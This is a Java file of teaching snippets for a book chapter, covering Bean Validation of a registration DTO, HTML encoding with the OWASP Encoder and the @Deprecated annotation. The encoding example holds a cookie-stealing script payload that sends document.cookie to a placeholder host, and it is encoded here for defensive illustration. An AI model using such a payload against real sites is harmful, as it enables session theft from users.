package chapter10.snippet;

import chapter10.listing102.UserRegistrationDTO;
import jakarta.validation.ConstraintViolation;
import jakarta.validation.Validation;
import jakarta.validation.Validator;
import jakarta.validation.ValidatorFactory;
import lombok.extern.slf4j.Slf4j;
import org.owasp.encoder.Encode;

/**
 * Supplementary snippets for Chapter 10.
 *
 * <p>This class contains small, focused examples used to illustrate several
 * concepts discussed in the chapter 10.</p>
 */
@Slf4j
public class Snippets {
  /**
   * Validates a {@link UserRegistrationDTO} using Jakarta Bean Validation.
   *
   * <p>This method creates a {@link Validator}, applies all constraints
   * declared on the DTO, and logs any violations.</p>
   *
   * @param dto the DTO instance to validate
   */
  private static void validateUserRegistrationDto(UserRegistrationDTO dto) {
    try (ValidatorFactory factory = Validation.buildDefaultValidatorFactory()) {
      Validator validator = factory.getValidator();
      var violations = validator.validate(dto);
      if (violations.isEmpty()) {
        log.info("Validation passed");
      } else {
        log.error("Validation failed:");
        for (ConstraintViolation<UserRegistrationDTO> v : violations) {
          log.error("{} {}", v.getPropertyPath(), v.getMessage());
        }
      }
    }
  }

  /**
   * Demonstrates sanitizing untrusted HTML content using the OWASP Encoder.
   */
  public void sanitizeHtmlExample() {
    String sanitized = Encode.forHtmlContent("<script>document.location='http://fake" + ".com" +
      "/cookie?data='+document.cookie</script>");
    log.info(sanitized);
  }

  /**
   * Demonstrates how to mark a method as deprecated.
   *
   * <p>This snippet shows how to use the {@link Deprecated} annotation with the
   * {@code since} and {@code forRemoval} attributes. The method has no real
   * implementation and exists only as an example for documentation and learning
   * purposes.</p>
   */
  @Deprecated(since = "2.1", forRemoval = true)
  public void generateReport() {  }

}
